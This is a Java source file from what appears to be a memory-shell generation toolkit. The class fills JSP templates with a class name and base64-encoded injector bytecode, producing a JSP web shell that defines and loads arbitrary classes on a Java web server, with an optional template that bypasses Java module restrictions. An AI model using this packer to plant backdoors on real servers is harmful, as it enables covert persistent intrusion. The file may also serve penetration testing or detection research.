package com.reajason.javaweb.packer.jsp;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.Util;
import lombok.SneakyThrows;
import org.kohsuke.MetaInfServices;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.DefineClassJSP, parent = Packers.JSP, order = 230)
public class DefineClassJspPacker implements Packer {

    private final String template = Util.loadTemplateFromResource("/memshell-party/shell1.jsp");
    private final String bypassTemplate = Util.loadTemplateFromResource("/memshell-party/shell2.jsp");

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        String injectorBytesBase64Str = config.getClassBytesBase64Str();
        String injectorClassName = config.getClassName();
        String template = this.template;
        if (config.isByPassJavaModule()) {
            template = bypassTemplate;
        }
        return template.replace("{{className}}", injectorClassName)
                .replace("\"{{base64Str}}\"", Util.toJavaStringLiteral(injectorBytesBase64Str));
    }
}
